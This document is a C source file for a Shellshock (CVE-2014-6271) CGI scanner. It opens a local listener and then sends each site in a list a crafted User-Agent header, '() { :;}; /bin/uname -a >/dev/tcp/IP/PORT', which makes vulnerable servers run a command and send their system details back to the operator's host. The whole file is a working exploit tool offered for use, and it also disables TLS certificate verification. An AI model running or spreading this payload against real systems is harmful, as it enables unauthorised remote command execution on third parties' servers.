#include <curl/curl.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <getopt.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>

pid_t bg;

void BindServer(const char *ip, unsigned int port){
	int my_socket, cli_socket;
	struct sockaddr_in server_addr,cli_addr;

	if ((my_socket = socket(AF_INET, SOCK_STREAM, 0)) == -1){
		printf("Fail to create socket\n");
		exit(1);
	}

	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(port);
	server_addr.sin_addr.s_addr = inet_addr(ip);
	bzero(&(server_addr.sin_zero), 8);

	int optval = 1;
	setsockopt(my_socket, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof optval);

	if (bind(my_socket, (struct sockaddr *)&server_addr, sizeof(struct sockaddr))== -1){
		printf("Fail to bind\n");
		exit(1);
	}

	if (listen(my_socket, 1) < 0){
		printf("Fail to listen\n");
		exit(1);
	} else {
		printf("[+] Listen on port %d\n",port);
	}

	socklen_t tamanho = sizeof(struct sockaddr_in);
	bg = fork();

	if(bg){
		printf("[+] Server running in background, PID: %d\n",bg);
		return;
	}

	while(1){
		if((cli_socket = accept(my_socket, (struct sockaddr *)&cli_addr,&tamanho)) < 0){
			printf("[-] error when receiving new connection\n");
			exit(0);
		}

		printf("New connection from: %s \n",inet_ntoa(cli_addr.sin_addr));

		if(fork() == 0){
			int numbytes;
			char buf[256];

			while( numbytes != 0 ){
				numbytes = recv(cli_socket, buf, 255, 0);
				buf[numbytes] = '\0';
				printf("%s",buf);
			}

			close(cli_socket);
			exit(0);
		}

	}

}

void GetParameters(FILE *arquivo,unsigned int *max,unsigned int *lines){
	char C;
	unsigned int x = 0,y = 0,aux = 0;

	while( (C = fgetc(arquivo)) != EOF ){
		if(C == '\n'){
			if(aux > x) x = aux;
			aux = 0;
			y++;
		}
		aux++;
	}

	*max = x;
	*lines = y;
	fseek(arquivo,0,SEEK_SET);
	return;
}

int HttpRequest(const char *site ,const char *agent, unsigned int timeout){
	CURL *curl;
	int http_code;

	curl = curl_easy_init();

	curl_easy_setopt(curl, CURLOPT_URL, site);
	curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);
	curl_easy_setopt(curl, CURLOPT_TIMEOUT, timeout);
	curl_easy_setopt(curl, CURLOPT_USERAGENT, agent);
	curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);

	if(strstr(site,"https://")){
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
	}

	curl_easy_perform(curl);

	curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
	return http_code;

}

void Help(void){
	printf("\n[+] CVE-2014-6271 CGI Scanner\n");
	printf("Author: MMxM (P0cL4bs Team)\n\n");
	printf("Options:\n\n");
	printf("\t-i <local ip-address>\n");
	printf("\t-p <port to listen>\n");
	printf("\t-l <site list>\n");
	printf("\t-t <connection timeout> (Default: 15s)\n\n");
	exit(0);
}

int main(int argc, char **argv){
	unsigned int port = 0, timeout = 15, Maxlen = 0, Lines = 0, Pos = 0, x = 1;
	char *ip_addr = NULL, *site_list = NULL, C;
	FILE *sites;
	int opt;

	while ((opt = getopt (argc, argv, "i:p:l:")) != -1)
		switch(opt){
			case 'i':
				ip_addr = optarg;
				break;
			case 'p':
				port = atoi(optarg);
				break;
			case 'l':
				site_list = optarg;
				break;
			case 't':
				timeout = atoi(optarg);
				break;
			case '?':
				if(optopt == 'i' || optopt == 'p' || optopt == 'l' || 't')
					fprintf(stderr, "Option -%c requires an argument.\n",optopt);
				else if(optopt == 0)
					break;
				else
					fprintf (stderr, "Unknown option `-%c'.%d\n", optopt,optopt);
				return 1;
			default:
				abort();
	}

	if(ip_addr == NULL || port == 0 || site_list == NULL)
		Help();

	sites = fopen(site_list,"r");
	if(sites == NULL){
		printf("Fail to read file\n");
		return 1;
	}

	GetParameters(sites,&Maxlen,&Lines);

	char Site[Maxlen];

	printf("[*] Starting listen (%s:%d)...\n",ip_addr,port);
	BindServer(ip_addr,port);

	char UserAgent[35+sizeof(unsigned int)+strlen(ip_addr)+1];
	snprintf(UserAgent,sizeof(UserAgent),"() { :;}; /bin/uname -a >/dev/tcp/%s/%d",ip_addr,port);

	printf("[*] Exploit: ");
	printf("'User-Agent: %s'\n",UserAgent);

	printf("\n\n[+] Starting Scanner !!!\n");

	while ( (C=fgetc(sites)) != EOF ){
		if(C=='\n'){
			Site[Pos] = '\0';
			Pos = 0;
			printf("\n[%d/%d] Checking: %s\n\n",Lines,x,Site);
			x++;
			printf("\n[+] Site return: %d Status Code\n",
				HttpRequest(Site,UserAgent,timeout)
			);
		} else {
			Site[Pos] = C;
			Pos++;
		}
	}
	fclose(sites);

	kill(bg,SIGTERM);
	wait(NULL);

	return 0;
}
